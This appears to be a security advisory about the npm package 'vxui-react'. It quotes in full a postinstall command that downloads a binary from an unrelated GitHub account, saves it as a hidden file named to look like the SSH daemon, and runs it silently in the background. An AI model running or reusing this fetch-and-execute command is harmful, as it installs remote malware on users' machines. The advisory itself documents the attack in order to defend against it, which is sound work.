summary: postinstall downloads and executes hidden binary from unrelated GitHub account
details: On `npm install`, the package's `postinstall` script in package.json line 43 runs `curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &`. This fetches a binary from a personal GitHub account (`parikhpreyash4`) unrelated to the package publisher, writes it to a hidden dotfile `/tmp/.sshd` masquerading as the OpenSSH daemon, makes it executable, and launches it detached in the background. TLS verification is disabled (`-k`), the URL uses the mutable `latest` release tag with no hash pinning, and stderr is suppressed. The binary names (`gvfsd-network`, `systemd-network-helper`, `.sshd`) are cover-story names mimicking legitimate system services. The package additionally lists itself (`vxui-react: ^1.3.1`) as one of its own dependencies, an anomaly consistent with attacker staging.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
